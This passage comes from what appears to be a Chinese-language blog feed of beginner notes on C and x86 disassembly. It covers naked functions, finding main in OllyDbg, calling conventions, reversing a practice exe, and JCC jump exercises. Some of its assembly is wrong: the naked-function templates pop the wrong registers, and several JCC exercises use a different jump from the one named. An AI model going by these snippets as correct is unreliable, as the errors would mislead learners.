个特殊符号字符、外来语字母和图形符号。</li></ul><p>为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（二）</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（二）"><a href="#C语言与反汇编学习（二）" class="headerlink" title="C语言与反汇编学习（二）"></a>C语言与反汇编学习（二）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。</p><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><h3 id="什么是裸函数？"><a href="#什么是裸函数？" class="headerlink" title="什么是裸函数？"></a>什么是裸函数？</h3><pre><code>void __declspec(naked) Function()  {.....}</code></pre><p>在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。</p><h3 id="运行裸函数为什么会出错"><a href="#运行裸函数为什么会出错" class="headerlink" title="运行裸函数为什么会出错"></a>运行裸函数为什么会出错</h3><p>以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以：</p><pre><code>void __declspec(naked) Function()  {    __asm ret}</code></pre><p>加一个ret就好了，不会再报错了。</p><h3 id="裸函数框架简单集合"><a href="#裸函数框架简单集合" class="headerlink" title="裸函数框架简单集合"></a>裸函数框架简单集合</h3><h4 id="无参数无返回值的函数框架"><a href="#无参数无返回值的函数框架" class="headerlink" title="无参数无返回值的函数框架"></a>无参数无返回值的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="有参数有返回值的函数框架"><a href="#有参数有返回值的函数框架" class="headerlink" title="有参数有返回值的函数框架"></a>有参数有返回值的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="带局部变量的函数框架"><a href="#带局部变量的函数框架" class="headerlink" title="带局部变量的函数框架"></a>带局部变量的函数框架</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov dword ptr ds:[ebp-4],2        mov dword ptr ds:[ebp-8],3        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        //注意汇编中局部变量的存放办法            pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><p><strong>在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。</strong></p><h3 id="针对裸函数的练习"><a href="#针对裸函数的练习" class="headerlink" title="针对裸函数的练习"></a>针对裸函数的练习</h3><p>目标是要实现以下功能：</p><pre><code>int plus(int x,int y,int z){    int a = 2;    int b = 3;    int c = 4;    return x+y+z+a+b+c;}</code></pre><p>代码：</p><pre><code>// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked)  plus(int x,int y,int z){    __asm    {        push ebp        mov ebp,esp        sub esp,0x40    //开栈        push ebx        push esi        push edi        //保护现场        lea edi,dword ptr ds:[ebp-0x40]        mov ecx,0x10        mov eax,0xCCCCCCCC        rep stosd        //为缓冲区填充数据        //真正要执行的功能        //局部变量：EBP—4开始 参数：ebp+8开始        //ebp+4是eip 原来call下条语句        mov eax,0x2        mov dword ptr ds:[ebp-0x4],eax        mov eax,0x3        mov dword ptr ds:[ebp-0x8],eax        mov eax,0x4        mov dword ptr ds:[ebp-0x0C],eax  //放入局部变量        mov eax,dword ptr ds:[ebp+0x8]        add eax,dword ptr ds:[ebp+0x0C]        add eax,dword ptr ds:[ebp+0x10]        add eax,dword ptr ds:[ebp-0x4]        add eax,dword ptr ds:[ebp-0x8]        add eax,dword ptr ds:[ebp-0x0C]         mov dword ptr ds:[ebp-0x4],eax    //把计算结果放入栈中，下面主函数打印a时要用到        pop edi;        pop esi;        pop ebx;        mov esp,ebp        pop ebp        ret    }}int main(int argc, char* argv[]){    int a;    a=plus(6,7,8);    printf(&quot;%d\n&quot;,a);    return 0;}</code></pre><p>练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。</p><h2 id="程序真正的入口"><a href="#程序真正的入口" class="headerlink" title="程序真正的入口"></a>程序真正的入口</h2><p>main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。</p><p>在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。</p><h3 id="main-函数的识别与寻找"><a href="#main-函数的识别与寻找" class="headerlink" title="main 函数的识别与寻找"></a>main 函数的识别与寻找</h3><p><strong>只是vc++6.0</strong><br>main 函数被调用前要先调用的函数如下：</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715025630158.jpg" srcset="/img/loading.gif" alt="-w414"><br>这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。<br>所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>常见的几种约定：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715066318478.jpg" srcset="/img/loading.gif" alt="-w355"></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，<br>调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038333622.jpg" srcset="/img/loading.gif" alt="-w267"></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用<code>_ stdcall</code>关键字即可。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038140613.jpg" srcset="/img/loading.gif" alt="-w295"><br>栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。</p><p>像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， <strong>被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小</strong>。</p><p><strong>虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。</strong>这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。</p><p>顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。</p><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715042971030.jpg" srcset="/img/loading.gif" alt="-w292"><br>就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715043849420.jpg" srcset="/img/loading.gif" alt="-w330"><br>这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。</p><h2 id="第一次完整逆一个exe（CallingConvention-exe）"><a href="#第一次完整逆一个exe（CallingConvention-exe）" class="headerlink" title="第一次完整逆一个exe（CallingConvention.exe）"></a>第一次完整逆一个exe（CallingConvention.exe）</h2><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715046760959.jpg" srcset="/img/loading.gif" alt="-w855"><br>简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715049691652.jpg" srcset="/img/loading.gif" alt="-w679"><br>疑似出现符合的情况，这时候按<code>F7</code>进去查看内部：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715050273427.jpg" srcset="/img/loading.gif" alt="-w535"><br>简单一看，就是我们要找的main函数。<br><strong>接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析</strong>：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051301041.jpg" srcset="/img/loading.gif" alt="-w1307"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051770389.jpg" srcset="/img/loading.gif" alt="-w1311"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715052426371.jpg" srcset="/img/loading.gif" alt="-w1254"><br>（箭头指的不是特别好……）</p><h3 id="逆成c代码"><a href="#逆成c代码" class="headerlink" title="逆成c代码"></a>逆成c代码</h3><pre><code>#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c){    return a+b+c;}int __cdecl plus3(int a,int b){    return a+b;}int __fastcall plus(int a,int b,int c,int d,int e){    int z,s;    z=plus2(a,b,c);    s=plus3(b,a);    return plus3(z,s);}int main(int argc, char* argv[]){    int x;    x=plus(1,3,4,6,7);    printf(&quot;%d\n&quot;,x);    return 0;}</code></pre><p>这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是</p><ul><li>开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、</li><li>fastcall的认识不是很好</li><li>传入的<code>6 7</code>做了什么也不是很清楚<br>最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（一）</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（一）"><a href="#C语言与反汇编学习（一）" class="headerlink" title="C语言与反汇编学习（一）"></a>C语言与反汇编学习（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。</p><h2 id="简单下熟悉VC6开发环境"><a href="#简单下熟悉VC6开发环境" class="headerlink" title="简单下熟悉VC6开发环境"></a>简单下熟悉VC6开发环境</h2><p>这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714523427592.jpg" srcset="/img/loading.gif" alt="-w911"></p><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5)</p><h3 id="一些简单操作"><a href="#一些简单操作" class="headerlink" title="一些简单操作"></a>一些简单操作</h3><h4 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h4><p><strong>设置断点</strong>是光标放到哪行代码后按下<code>F9</code>即可，这也是后面很多操作的最重要的起初操作。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714525807811.jpg" srcset="/img/loading.gif" alt="-w338"></p><h4 id="调出寄存器，栈，内存窗口"><a href="#调出寄存器，栈，内存窗口" class="headerlink" title="调出寄存器，栈，内存窗口"></a>调出寄存器，栈，内存窗口</h4><p><strong>调出寄存器，栈，内存窗口</strong><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528282225.jpg" srcset="/img/loading.gif" alt="-w586"><br>看图，在空白处右击点击一下你需要的窗口就好了。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528997602.jpg" srcset="/img/loading.gif" alt="-w526"></p><h4 id="进入反汇编窗口"><a href="#进入反汇编窗口" class="headerlink" title="进入反汇编窗口"></a>进入反汇编窗口</h4><p>在程序运行时，且有适当断点的时候，看图<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714530279259.jpg" srcset="/img/loading.gif" alt="-w517"></p><p>右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：<code>F10 F11</code>分别是步过和步入。这个跟od里不一样。</p><h2 id="C语言的调用"><a href="#C语言的调用" class="headerlink" title="C语言的调用"></a>C语言的调用</h2><p>1、无参数，无返回值的函数调用<br>2、有参数，无返回值的函数调用<br>3、无参数，有返回值的函数调用<br>4、有参数，有返回值的函数调用</p><h2 id="函数的反汇编分析-空函数"><a href="#函数的反汇编分析-空函数" class="headerlink" title="函数的反汇编分析-空函数"></a>函数的反汇编分析-空函数</h2><h3 id="先上c："><a href="#先上c：" class="headerlink" title="先上c："></a>先上c：</h3><pre><code>#include &quot;stdafx.h&quot;void Function(){}int main(int argc, char* argv[]){    Function()    return 0;}</code></pre><h3 id="反汇编分析："><a href="#反汇编分析：" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714535234194.jpg" srcset="/img/loading.gif" alt="-w438"></p><h2 id="函数的反汇编分析-简单功能"><a href="#函数的反汇编分析-简单功能" class="headerlink" title="函数的反汇编分析-简单功能"></a>函数的反汇编分析-简单功能</h2><h3 id="两个数相加："><a href="#两个数相加：" class="headerlink" title="两个数相加："></a>两个数相加：</h3><h4 id="c代码："><a href="#c代码：" class="headerlink" title="c代码："></a>c代码：</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1);    return 0;}</code></pre><h4 id="反汇编分析：-1"><a href="#反汇编分析：-1" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714537632825.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="三个数相加："><a href="#三个数相加：" class="headerlink" title="三个数相加："></a>三个数相加：</h3><h4 id="c代码：-1"><a href="#c代码：-1" class="headerlink" title="c代码："></a>c代码：</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y，int z){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1,3);    return 0;}</code></pre><h4 id="反汇编分析：-2"><a href="#反汇编分析：-2" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714539277702.jpg" srcset="/img/loading.gif" alt="-w974"><br>（和上面那个基本一样，只是为了练习，不详细写了）</p><h2 id="函数的反汇编分析-嵌套调用"><a href="#函数的反汇编分析-嵌套调用" class="headerlink" title="函数的反汇编分析-嵌套调用"></a>函数的反汇编分析-嵌套调用</h2><p>要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2).</p><h3 id="c代码"><a href="#c代码" class="headerlink" title="c代码"></a>c代码</h3><pre><code>#include &quot;stdafx.h&quot;int Plus1(int x,int y){    return x+y;}int Plus2(int x,int y,int z){    return x+y+z;}int Plus3(int a,int b,int c,int d,int e){    int i,j,m;    i=Plus1(a,b);    j=Plus2(c,d,e);    m=Plus1(i,j);    return m;}int main(int argc, char* argv[]){    Plus3(2,1,3,1,5);    return 0;}</code></pre><h3 id="反汇编分析：-3"><a href="#反汇编分析：-3" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714541318519.jpg" srcset="/img/loading.gif" alt="-w1534"><br>（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。）</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，<strong>（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记</strong>）也熟悉了函数是如何嵌套调用的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JCC学习</title>
    <link href="/2019/10/07/JCC/"/>
    <url>/2019/10/07/JCC/</url>
    
    <content type="html"><![CDATA[<h1 id="JCC学习"><a href="#JCC学习" class="headerlink" title="JCC学习"></a>JCC学习</h1><h2 id="JCC指令集合"><a href="#JCC指令集合" class="headerlink" title="JCC指令集合"></a>JCC指令集合</h2><h3 id="详细"><a href="#详细" class="headerlink" title="详细__"></a>详细__</h3><p>1、JE, JZ　　　　　　结果为零则跳转(相等时跳转)　　　　 　　 ZF=1</p><p>2、JNE, JNZ　　  　　结果不为零则跳转(不相等时跳转) 　　　　   ZF=0</p><p>3、JS　　　　　　　  结果为负则跳转　　　　　　　　　　　　    SF=1</p><p>4、JNS 　　　　　　  结果为非负则跳转　　　　　　　　　　　   SF=0</p><p>5、JP, JPE　　　　　 结果中1的个数为偶数则跳转　　　　　　      PF=1</p><p>6、JNP, JPO　　　　  结果中1的个数为偶数则跳转　　　　　　      PF=0</p><p>7、JO　　　　　　　  结果溢出了则跳转　　　　　　　　　　      OF=1</p><p>8、JNO 　　　　　　  结果没有溢出则跳转　　　　　　　　            OF=0</p><p>9、JB, JNAE 　　　　 小于则跳转 (无符号数)　　　　　　　　　   CF=1</p><p>10、JNB, JAE 　　　  大于等于则跳转 (无符号数)　　　　　　　   CF=0</p><p>11、JBE, JNA  　　　 小于等于则跳转 (无符号数)　　　　　　　  CF=1 or ZF=1</p><p>12、JNBE, JA 　　　  大于则跳转(无符号数)　　　　　　　　　  CF=0 and ZF=0</p><p>13、JL, JNGE 　　　  小于则跳转 (<strong>有符号数</strong>)　　　　　　　　    SF≠ OF</p><p>14、JNL, JGE　　　   大于等于则跳转 (<strong>有符号数</strong>)　　　　　　    SF=OF</p><p>15、JLE, JNG  　　　 小于等于则跳转 (<strong>有符号数</strong>)　　　　　　    ZF=1 or SF≠ OF</p><p>16、JNLE, JG 　　　  大于则跳转(<strong>有符号数</strong>)　　　　　　　　     ZF=0 and SF=OF</p><h3 id="表格总结"><a href="#表格总结" class="headerlink" title="表格总结"></a>表格总结</h3><p><img src="/2019/10/07/JCC/images/15713086707312.jpg" srcset="/img/loading.gif" alt="-w1067"></p><p>直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要<strong>注意那些有符号的JCC跳转指令，</strong>因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p><strong>JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的</strong></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转"><a href="#使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转" class="headerlink" title="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转."></a>使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.</h3><p>前提：能用CMP和TEST实现的优先考虑.</p><h4 id="1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1"><a href="#1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1" class="headerlink" title="1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1"></a>1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1</h4><pre><code>MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B</code></pre><h4 id="2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0"><a href="#2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0" class="headerlink" title="2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0"></a>2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0</h4><pre><code>MOV AL,1TEST AL,ALJNZ 0X00401006</code></pre><h4 id="3、-JS-结果为负则跳转-SF-1"><a href="#3、-JS-结果为负则跳转-SF-1" class="headerlink" title="3、 JS 结果为负则跳转 SF=1"></a>3、 JS 结果为负则跳转 SF=1</h4><pre><code>MOV AL,1MOV CL,2CMP AL,CL</code></pre><h4 id="4、-JNS-结果为非负则跳转-SF-0"><a href="#4、-JNS-结果为非负则跳转-SF-0" class="headerlink" title="4、 JNS 结果为非负则跳转 SF=0"></a>4、 JNS 结果为非负则跳转 SF=0</h4><pre><code>XOR EAX,EAXJNS 0X0040102F</code></pre><h4 id="5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1"><a href="#5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1" class="headerlink" title="5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1"></a>5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1</h4><pre><code>MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008</code></pre><h4 id="6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0"><a href="#6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0" class="headerlink" title="6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0"></a>6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0</h4><pre><code>MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008</code></pre><h4 id="7、-JO-结果溢出了则跳转-OF-1"><a href="#7、-JO-结果溢出了则跳转-OF-1" class="headerlink" title="7、 JO 结果溢出了则跳转 OF=1"></a>7、 JO 结果溢出了则跳转 OF=1</h4><pre><code>MOV AL,80SUB AL,10JO 0X00401008</code></pre><h4 id="8、-JNO-结果没有溢出则跳转-OF-0"><a href="#8、-JNO-结果没有溢出则跳转-OF-0" class="headerlink" title="8、 JNO 结果没有溢出则跳转 OF=0"></a>8、 JNO 结果没有溢出则跳转 OF=0</h4><pre><code>MOV AX,0FFFFADD AX,80JNO 0X00401010</code></pre><h4 id="9、-JB-JNAE-小于则跳转-无符号数-CF-1"><a href="#9、-JB-JNAE-小于则跳转-无符号数-CF-1" class="headerlink" title="9、 JB, JNAE 小于则跳转 (无符号数) CF=1"></a>9、 JB, JNAE 小于则跳转 (无符号数) CF=1</h4><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="10、-JNB-JAE-大于等于则跳转-无符号数-CF-0"><a href="#10、-JNB-JAE-大于等于则跳转-无符号数-CF-0" class="headerlink" title="10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0"></a>10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0</h4><pre><code>MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044</code></pre><h4 id="11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1"><a href="#11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1" class="headerlink" title="11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1"></a>11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1</h4><p>一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。<br>    MOV AL,1<br>    MOV CL,1<br>    CMP AL,CL<br>    JE 0X0040102B<br>或者</p><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0"><a href="#12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0" class="headerlink" title="12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0"></a>12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0</h4><pre><code>MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044</code></pre><p>解析：</p><p>这个与练习10的区别就是不可以让两个数相等。</p><h4 id="13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF"><a href="#13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF" class="headerlink" title="13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF"></a>13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF</h4><pre><code>MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063</code></pre><p>解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：<strong>就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！</strong></p><p><strong>比如这个练习用到了JL,FF就是-1了，那么<code>-1&lt;1</code>这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。</strong></p><h4 id="14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF"><a href="#14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF" class="headerlink" title="14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF"></a>14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B</code></pre><h4 id="15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF"><a href="#15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF" class="headerlink" title="15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF"></a>15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B</code></pre><p>这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，<strong>这两个操作数只能是相同的数，没什么看不看做有无符号的说法</strong>。</p><h4 id="16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF"><a href="#16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF" class="headerlink" title="16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF"></a>16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF</h4><pre><code>MOV AX,1MOV CX,FFCMP AX,CXJG  0x004010A6MOV AL,1MOV CL,0FFCMP AL,CLJG  0x004010A6</code></pre><p>解析：</p><p>判断一下，第1段代码对还是第2段代码对？</p><p>在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，<strong>且一定要注意下数据宽度。</strong>在这个例子中，第一段代码是无法实现JG跳转的，<strong>因为其数据宽度的问题，影响到SF,所以其没办法<code>SF=OF</code>就没法跳转。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>标志寄存器</title>
    <link href="/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
